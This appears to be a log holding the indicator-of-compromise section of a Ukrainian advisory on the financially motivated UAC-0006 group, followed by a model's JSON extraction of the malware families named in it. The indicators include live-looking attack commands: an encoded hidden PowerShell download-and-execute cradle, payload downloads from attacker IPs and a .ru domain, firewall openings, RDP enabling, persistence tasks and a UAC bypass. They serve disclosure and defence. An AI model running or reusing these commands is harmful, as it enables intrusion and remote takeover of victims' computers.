+%PROGRAMDATA%\nvotaw\dooo.exe
+%PROGRAMDATA%\Windows\App\hosts\svchosts.exe
+%PUBLIC%\Identities\Windows\stp.bat
+%PUBLIC%\Identities\Windows\stp.vbs
+%PUBLIC%\Identities\Windows\syslib.dll
+%PUBLIC%\Identities\Windows\windef.exe
+%PUBLIC%\Library\Windows\inf.ini
+%PUBLIC%\Library\Windows\r.reg
+%PUBLIC%\Library\Windows\stp.bat
+%PUBLIC%\Library\Windows\stp.vbs
+%PUBLIC%\Library\Windows\syslib.dll
+%PUBLIC%\Library\Windows\windef.exe
+%SYSTEMDRIVE%\Intel\Pax_18_08_23.zip
+%SYSTEMDRIVE%\Intel\Рахунок_фактура_вiд_18_08_2023р_Помилкове_зарахування.zip
+%SYSTEMDRIVE%\osbb\update.exe
+%SYSTEMDRIVE%\osbb\update_clean.exe
+%SYSTEMROOT%\System32\Tasks\Firefox Default Browser Agent 8F77277734F8D18C
+%SYSTEMROOT%\System32\Tasks\Firefox Default Browser Agent AB78A20EA3F0B21D
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Common Factory
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Common Factory One
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Defender Lybrary
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Defender Setting
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Defender Setting Factory Live
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Library Security
+%SYSTEMROOT%\System32\Tasks\Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Library Security One
+%SYSTEMROOT%\System32\Tasks\dooo
+%SYSTEMROOT%\svchost.exe
+%TMP%\167C.exe
+%TMP%\2B07.tmp.exe
+%TMP%\2CBE.exe
+%TMP%\36B0.exe
+%TMP%\376.tmp.exe
+%TMP%\3C46.exe
+%TMP%\3FE.tmp.exe
+%TMP%\4696.tmp.exe
+%TMP%\50A4.exe
+%TMP%\588F.tmp.exe
+%TMP%\595a.tmp.exe
+%TMP%\633F.tmp.exe
+%TMP%\7500.tmp.exe
+%TMP%\7AA7.exe
+%TMP%\A2.exe
+%TMP%\A9D5.exe
+%TMP%\AC4.tmp.exe
+%TMP%\B1BF.tmp.exe
+%TMP%\BD17.exe
+%TMP%\C1CF.tmp.exe
+%TMP%\C34B.exe
+%TMP%\D205.exe
+%TMP%\D355.exe
+%TMP%\DB67.exe
+%TMP%\DDDA.tmp.exe
+%TMP%\DUvVPmZ.exe
+%TMP%\E52C.exe
+%TMP%\F10F.exe
+%TMP%\FC4A.exe
+%TMP%\bSfLcdNP.exe
+%TMP%\CAFA.tmp.exe
+%TMP%\mrbDBE.exe
+%TMP%\pssD713.ps1
+%TMP%\wmpsystem.exe
+%USERPROFILE%2\AppData\Local\Temp\674B.exe
+%USERPROFILE%2\AppData\Local\Temp\71CB.tmp.exe
+%USERPROFILE%2\AppData\Local\Temp\pssCAE4.ps1
+%USERPROFILE%2\AppData\Local\Temp\pssCD49.ps1
+%USERPROFILE%2\AppData\Local\Temp\srkDKFa.exe
+%USERPROFILE%2\AppData\Roaming\rshirca
+%USERPROFILE%2\AppData\Roaming\uaraewj
+%USERPROFILE%2\Downloads\Payment_9312_0580_6944_3255.bat
+%USERPROFILE%2\Downloads\Рахунки.tar
+%USERPROFILE%\AppData09542\wmpsystem.exe
+%USERPROFILE%\AppData12826\wmpsystem.exe
+%USERPROFILE%\AppData66961\wmpsystem.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchosts.exe
+%USERPROFILE%\AppData\Roaming\PDR\Rar.exe
+%USERPROFILE%\AppData\Roaming\iwhhchh
+%USERPROFILE%\AppData\Roaming\tgaaafr
+%USERPROFILE%\Desktop\Отсканированные документи\рахунок_вiд_12_07_2023_до_оплати.vbs
+%USERPROFILE%\Downloads\Рахунки.tar
+%USERPROFILE%\Downloads\Рахунок_фактура_вiд_18_08_2023р_Помилкове_зарахування.zip
+%USERPROFILE%\Downloads\накладная_jpg
+Rar.exe x -t -o+ -pdsafsfghghjujgdhfg "%PROGRAMDATA%\WindowsTasksService\rss.rar" "%PROGRAMDATA%\WindowsTasksService\"
+Rar.exe x -t -o+ -pfdsggjhfjgfdhdfsghdf "%PROGRAMDATA%\WindowsTasksService\pdrs.rar" "%PROGRAMDATA%\WindowsTasksService\"
+netsh advfirewall firewall add rule name="ZET_WINDOWS" dir=in action=allow program="%PROGRAMDATA%\WindowsTasksService\winserv.exe" enable=yes
+netsh advfirewall firewall add rule name=Z2TP_TCP protocol=TCP localport=5655 action=allow dir=IN
+REG ADD "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+powErshEll -nop -w hiddEn -Ep bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZABvAHcAbgBsAG8AYQBkAHIAZQB6AGUAcgB2AGUAcwAuAHIAdQAvAGkAbgBkAGUAeAAuAHAAaABwACIAKQA=
+powershell -C "Remove-ItemProperty -Path "HKCU:\Environment" -Name 'WinDir'"
+powershell -C Set-ItemProperty -Path "HKCU:\Environment" -Name "WinDir" -Value 'cmd.exe /c netsh advfirewall firewall add rule name="whosts.exe" dir=OUT action=allow program="%APPPATH%" enable=yes&amp;&amp;exit &amp;
+powershell -Command (new-object System.Net.WebClient).DownloadFile('hXXp://152.89.198.77/Rar64.exe', '%PROGRAMDATA%\WindowsTasksService\Rar.exe')
+powershell -Command (new-object System.Net.WebClient).DownloadFile('hXXp://152.89.198.77/rss.rar', '%PROGRAMDATA%\WindowsTasksService\rss.rar')
+powershell -Command (new-object System.Net.WebClient).DownloadFile('hXXp://217.12.206.218/Rar64.exe', '%PROGRAMDATA%\WindowsTasksService\Rar.exe')
+powershell -Command (new-object System.Net.WebClient).DownloadFile('hXXp://217.12.206.218/pdrs.rar', '%PROGRAMDATA%\WindowsTasksService\pdrs.rar')
+powershell -Command (new-object System.Net.WebClient).DownloadFile('hXXp://217.12.206.218/rss.rar ', '%PROGRAMDATA%\WindowsTasksService\rss.rar')
+powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File %TMP%\pssD713.ps1
+$path = $Env:temp+'\AsmLUkHt.exe'; $client = New-Object System.Net.WebClient; $client.downloadfile('hXXp://downloadrezerves.ru/download11/mstsc.exe',$path); Start-Process -FilePath $path
+IEX (New-Object Net.Webclient).downloadstring("hXXp://downloadrezerves.ru/index.php")
+%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -C Remove-ItemProperty -Path HKCU:\Environment -Name 'WinDir'
+%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -C Set-ItemProperty -Path HKCU:\Environment -Name WinDir -Value 'cmd.exe /c netsh advfirewall firewall add rule name=whosts.exe dir=OUT action=allow program=%PROGRAMDATA%\Windows\App\Add\sys\whosts.exe enable=yes&amp;&amp;exit &amp;'
+schtasks /create /tn "Microsoft\Windows\Windows Setting Factory\Microsoft\CommonFile\DefenderSetting" /f /tr "%PROGRAMDATA%\WindowsTasksService\winserv.exe" /sc ONLOGON /rl HIGHEST
+schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup
+start "pdrs.exe" "%ALLUSERSPROFILE%\WindowsTasksService\pdrs.exe"
+start "winserv.exe" "%ALLUSERSPROFILE%\WindowsTasksService\winserv.exe"
+%PUBLIC%\Identities\Windows\stp.bat -NoLogo -NoExit
+%PUBLIC%\Identities\Windows\stp.vbs -NoLogo -NoExit
+%APPDATA%\pythonw.exe %APPDATA%\python.py
+%PUBLIC%\Library\Windows\stp.bat -NoLogo -NoExit
+%PUBLIC%\Library\Windows\stp.vbs -NoLogo -NoExit
+Common Factory (Scheduled Task)
+Common Factory One (Scheduled Task)
+Defender Lybrary (Scheduled Task)
+Defender Setting (Scheduled Task)
+Firefox Default Browser Agent 8F77277734F8D18C (Scheduled Task)
+Firefox Default Browser Agent AB78A20EA3F0B21D (Scheduled Task)
+Library Security (Scheduled Task)
+Library Security One (Scheduled Task)
+Windows_Service_Drivers (Service)
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'ServiceDriver'
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'SystemCertificate'
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'SystemCertificates'
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'WinServ'
+HKEY_CURRENT_USER\SOFTWARE\tektonit\Remote MANIPULATOR System\Host\Parameters
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p>
+
+=== RESPONSE (6.9s, in 18012 / out 2161 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cybercriminal group active since 2013 targeting Ukrainian organizations."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "SMOKELOADER",
+      "kind": "malware family",
+      "gloss": "A modular malware downloader used to drop and execute secondary payloads."
+    },
+    {
+      "name": "LOADERX3",
+      "kind": "malware family",
+      "gloss": "A malware loader used to deploy subsequent malicious components on infected systems."
+    },
+    {
+      "name": "RMS",
+      "kind": "software product",
+      "gloss": "A legitimate remote administration utility often abused by threat actors for unauthorized access."
+    },
+    {
+      "name": "RDPWRAPPER",
+      "kind": "software product",
+      "gloss": "A software library used to enable Remote Desktop Host support on Windows workstations."
+    },
+    {
+      "name": "DANABOT",
+      "kind": "malware family",
+      "gloss": "A modular banking Trojan and information stealer."
+    },
+    {
+      "name": "LUMMASTEALER",
+      "kind": "malware family",
+      "gloss": "An information stealer malware targeting credentials, cryptocurrency wallets, and browser data."
+    },
+    {
+      "name": "REDLINESTEALER",
+      "kind": "malware family",
+      "gloss": "A commercial information stealer malware that harvests credentials, cookies, and system information."
+    },
+    {
+      "name": "SYSTEMBC",
+      "kind": "malware family",
+      "gloss": "A proxy and backdoor malware used to route malicious traffic and maintain access."
+    },
+    {
+      "name": "TALESHOT",
+      "kind": "malware family",
+      "gloss": "A spyware tool used to capture screenshots and analyze active window titles and processes."
+    },
+    {
+      "name": "PIEJET",
+      "kind": "malware family",
+      "gloss": "A Python-based malicious loader or script used by cybercriminals."
+    },
+    {
+      "name": "LOADNEST",
+      "kind": "malware family",
+      "gloss": "A malware loader designed to deploy additional malicious payloads."
+    },
+    {
+      "name": "HANGTHREAD",
+      "kind": "malware family",
+      "gloss": "A specialized tool designed to cause denial of service by exhausting computing resources."
+    },
+    {
+      "name": "BACKSTAB",
+      "kind": "malware tool",
+      "gloss": "A tool used by threat actors to disable security software processes using legitimate signed drivers."
+    },
+    {
+      "name": "AUKILL",
+      "kind": "malware tool",
+      "gloss": "A defense evasion tool used to disable endpoint detection and response (EDR) software."
+    },
+    {
+      "name": "Windows",
+      "kind": "operating system",
+      "gloss": "A series of proprietary graphical operating systems developed and marketed by Microsoft."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "attacks",
+      "tail": "Україна",
+      "evidence": "угрупування UAC-0006 посідає перше місце в категорії фінансових злочинів, здійснюючи (спроби) викрадення грошових коштів з рахунків українських підприємств"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "SMOKELOADER",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: SMOKELOADER"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "LOADERX3",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: LOADERX3"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "RMS",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: RMS"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "RDPWRAPPER",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: RDPWRAPPER"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "DANABOT",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: DANABOT"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "LUMMASTEALER",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: LUMMASTEALER"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "REDLINESTEALER",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: REDLINESTEALER"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "SYSTEMBC",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: SYSTEMBC"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "TALESHOT",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: TALESHOT"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "PIEJET",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: PIEJET"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "LOADNEST",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: LOADNEST"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "HANGTHREAD",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: HANGTHREAD"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "BACKSTAB",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: BACKSTAB"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "AUKILL",
+      "evidence": "приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема: AUKILL"
+    }
+  ],
+  "newRelationTypes": []
+}
